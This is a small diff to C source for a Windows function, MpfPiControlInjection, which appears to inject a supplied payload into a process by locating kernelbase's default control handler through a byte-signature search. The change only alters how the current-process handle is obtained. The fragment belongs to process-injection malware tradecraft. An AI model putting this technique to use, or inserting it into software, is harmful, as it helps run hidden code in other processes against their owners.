@@ -29,7 +29,7 @@ BOOL MpfPiControlInjection(_In_ PBYTE Payload, _In_ DWORD PayloadSizeInBytes, _I
 	if (!RtlEncodeRemotePointer)
 		goto EXIT_ROUTINE;
 
-	if (!K32GetModuleInformation(InlineGetCurrentProcess, hKernelbase, &KernelbaseInformation, sizeof(KernelbaseInformation)))
+	if (!K32GetModuleInformation(GetCurrentProcessNoForward(), hKernelbase, &KernelbaseInformation, sizeof(KernelbaseInformation)))
 		goto EXIT_ROUTINE;
 
 	KernelBaseDefaultHandler = (PCHAR)MemoryFindMemory(hKernelbase, KernelbaseInformation.SizeOfImage, (PVOID)"\x48\x83\xec\x28\xb9\x3a\x01\x00\xc0", 9);
